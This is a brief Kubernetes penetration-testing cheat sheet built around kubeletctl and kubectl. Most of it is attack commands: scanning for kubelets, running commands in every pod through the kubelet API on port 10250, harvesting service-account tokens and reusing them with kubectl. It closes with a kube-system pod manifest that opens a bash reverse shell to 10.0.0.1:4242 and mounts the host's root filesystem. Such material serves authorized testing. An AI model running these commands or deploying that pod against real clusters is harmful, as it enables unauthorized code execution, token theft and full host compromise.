# Kubernetes Pentest with kubeletctl and kubectl

References:  

- <https://github.com/cyberark/kubeletctl>
- <https://www.cyberark.com/resources/threat-research-blog/using-kubelet-client-to-attack-the-kubernetes-cluster>

## Cheatsheet

```bash
# Scan for nodes
kubeletctl scan --cidr <CIDR notation>

# List pods in a node 
kubeletctl --server <node ip> pods

# Run commands in a pod
curl -ks -X POST https://<node_ip>:10250/run/<namespace>/<pod>/<container> -d "cmd=ls /"

# Run commands in all pods
kubeletctl run "whoami" --all-pods --server <node ip>

# Run a command on a specific pod
kubeletctl run "whoami" --pod <pod name> --namespace <namespace> --container <container> --server <node ip>

# Scan for tokens
kubeletctl scan token --server <node ip>

# Interact with kubectl and tokens
kubectl -s <server:port> --certificate-authority="<ca.crt file>" --token=$(cat token.txt)
```

Pod reverse shell  

```yaml
# https://rioasmara.com/2021/09/18/kubernetes-yaml-for-reverse-shell-and-map-root/
apiVersion: v1
kind: Pod
metadata:
  name: alpine
  namespace: kube-system
spec:
  containers:
  - name: alpine
    image: localhost:5000/dev-alpine
    command: ["/bin/bash"]
    args: ["-c", "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"]
    volumeMounts:
    - mountPath: /root/
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```
